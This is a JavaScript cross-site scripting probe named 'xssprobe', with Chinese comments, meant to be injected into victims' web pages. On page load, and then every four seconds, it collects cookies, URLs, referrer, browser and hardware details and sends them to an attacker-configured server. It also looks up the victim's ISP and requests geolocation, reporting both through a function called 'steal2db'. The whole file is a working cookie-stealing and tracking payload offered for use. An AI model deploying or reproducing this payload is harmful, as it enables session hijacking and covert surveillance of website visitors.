/*
xssprobe
*/

// 获取隐私信息的服务端页面，这里需配置为自己的probe.php网址
http_server = "http://{IP}:{PORT}/rtcmd?i=";

var info = {}; // 隐私信息字典
info.browser = function(){
	ua = navigator.userAgent.toLowerCase();
	var rwebkit = /(webkit)[ \/]([\w.]+)/;
	var ropera = /(opera)(?:.*version)?[ \/]([\w.]+)/;
	var rmsie = /(msie) ([\w.]+)/;
	var rmozilla = /(mozilla)(?:.*? rv:([\w.]+))?/;
	var match = rwebkit.exec( ua ) ||
		ropera.exec( ua ) ||
		rmsie.exec( ua ) ||
		ua.indexOf("compatible") < 0 && rmozilla.exec( ua ) ||
		[];
	return {name: match[1] || "", version: match[2] || "0"};
}();
info.ua = escape(navigator.userAgent);
info.lang = navigator.language;
info.referrer = escape(document.referrer);
info.location = escape(window.location.href);
info.toplocation = escape(top.location.href);
info.cookie = escape(document.cookie);
info.domain = document.domain;
info.title = document.title;
info.screen = function(){
	var c = "";
	if (self.screen) {c = screen.width+"x"+screen.height;}
	return c;
}();
info.flash = function(){
	var f="",n=navigator;
	if (n.plugins && n.plugins.length) {
		for (var ii=0;ii<n.plugins.length;ii++) {
			if (n.plugins[ii].name.indexOf('Shockwave Flash')!=-1) {
				f=n.plugins[ii].description.split('Shockwave Flash ')[1];
				break;
			}
		}
	}
	else
	if (window.ActiveXObject) {
		for (var ii=20;ii>=2;ii--) {
			try {
				var fl=eval("new ActiveXObject('ShockwaveFlash.ShockwaveFlash."+ii+"');");
				if (fl) {
					f=ii + '.0';
					break;
				}
			}
			 catch(e) {}
		}
	}
	return f;
}(); 

info.cpucores = function() {
    var cores = '';
    try {
      if(typeof navigator.hardwareConcurrency != 'undefined') {
        cores = navigator.hardwareConcurrency;
      }
    } catch(e) {
      cores = '';
    }
    return cores;
}();
info.memory = function() {
    var memory = '';
    try {
      if(typeof navigator.deviceMemory != 'undefined') {
        memory = navigator.deviceMemory;
      }
    } catch(e) {
      memory = '';
    }
    return memory;
}();
info.localtime = function() {
	var local_time = new Date();
	return local_time.toLocaleString();
}();


function json2str(o) {
	var arr = [];
	var fmt = function(s) {
		if (typeof s == 'object' && s != null) return json2str(s);
		return /^(string|number)$/.test(typeof s) ? "'" + s + "'" : s;
	}
	for (var i in o) arr.push("'" + i + "':" + fmt(o[i]));
	return '{' + arr.join(',') + '}';
} 

function getisp(){
	//获取运营商信息
	var url = 'http://ip-api.com/json/';
	var Http = false;
	if(window.XMLHttpRequest) {
		Http = new XMLHttpRequest();
	} else if(window.ActiveXObject) {
		try {
			Http = new window.ActiveXObject('Microsoft.XMLHTTP');
		} catch(e) {}
	}
	
	Http.open("GET", url);
	Http.send();
	
	Http.onreadystatechange=function(){
		if(this.readyState == 4 && this.status == 200) {
			json_data = JSON.parse(Http.responseText);
			region_isp = json_data.isp;
			
			w2g.net.steal2db(region_isp,5);
		}
	
	}
}

function getLocation(){
	//获取定位信息，需要允许权限
    function showPosition(position)
    {	
		var position = "lng="+position.coords.longitude+"&lat="+position.coords.latitude;
		console.log(position);
	    w2g.net.steal2db(position,6);
    }
	
	if (navigator.geolocation)
	{
		navigator.geolocation.getCurrentPosition(showPosition,getLocation);
	}

}


window.onload = function(){
  var i = json2str(info);
  // new Image().src = http_server + i;
  var req = {
    type: "GET", // GET
    url: http_server + i,
    async: true, // false
    contentType: "application/x-www-form-urlencoded", // multipart/form-data; boundary=-------------------7964f8dddeb95fc5
  }
  w2g.ajax.req(req);
  getisp();
  getLocation();
}

var interval = (interval == 'undefined')?interval:4000;

window.setInterval(function () {
	
	var i = json2str(info);
	var req = {
	  type: "GET", // GET
	  url: http_server + i,
	  async: true, // false
	  contentType: "application/x-www-form-urlencoded", // multipart/form-data; boundary=-------------------7964f8dddeb95fc5
	}
	w2g.ajax.req(req);	
}, interval);

